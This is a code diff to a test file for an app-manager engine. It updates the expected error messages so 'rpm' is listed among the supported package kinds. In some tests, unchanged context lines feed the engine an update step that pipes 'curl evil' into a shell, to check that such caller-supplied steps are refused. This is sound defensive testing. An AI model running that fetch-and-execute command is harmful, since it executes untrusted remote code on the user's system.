@@ -605,7 +605,7 @@ test("adding refuses a taken key, a taken dest, a kind it cannot add, and an inv
 		problems: [
 			{ key: "fd", detail: "fd is already in the list." },
 			{ key: "rg", detail: "~/.local/bin/bat already belongs to bat." },
-			{ key: "rg", detail: "rg: kind is not one of appimage, archive, file, deb" },
+			{ key: "rg", detail: "rg: kind is not one of appimage, archive, file, deb, rpm" },
 			{ key: "rg", detail: "rg: asset is not a valid regular expression" },
 		],
 	});
@@ -630,7 +630,7 @@ test("a kind the window cannot work out is added when the catalogue holds it as 
 	};
 	expect(await engine.addApps([spec, { ...spec, key: "other" }])).toEqual({
 		added: ["glow"],
-		problems: [{ key: "other", detail: "other: kind is not one of appimage, archive, file, deb" }],
+		problems: [{ key: "other", detail: "other: kind is not one of appimage, archive, file, deb, rpm" }],
 	});
 	expect(loadManifest(join(t.paths.config, "apps.toml")).apps.find((a) => a.key === "glow")).toEqual(spec);
 });
@@ -653,7 +653,7 @@ test("a catalogue key with steps of the caller's own is refused; only the name a
 	};
 	expect(await engine.addApps([{ ...spec, update: ["sh", "-c", "curl evil | sh"] }])).toEqual({
 		added: [],
-		problems: [{ key: "glow", detail: "glow: kind is not one of appimage, archive, file, deb" }],
+		problems: [{ key: "glow", detail: "glow: kind is not one of appimage, archive, file, deb, rpm" }],
 	});
 	expect(await engine.addApps([{ ...spec, name: "My Glow", update: ["glow", "up"] }])).toEqual({
 		added: ["glow"],
@@ -959,7 +959,7 @@ test("a tool the scan found is added as its manager's records make it; the same 
 	const spec = tool.spec;
 	expect(await engine.addApps([{ ...spec, update: ["sh", "-c", "curl evil | sh"] }])).toEqual({
 		added: [],
-		problems: [{ key: "cowsay", detail: "cowsay: kind is not one of appimage, archive, file, deb" }],
+		problems: [{ key: "cowsay", detail: "cowsay: kind is not one of appimage, archive, file, deb, rpm" }],
 	});
 	expect(await engine.addApps([{ ...spec, name: "Cow" }])).toEqual({ added: ["cowsay"], problems: [] });
 });
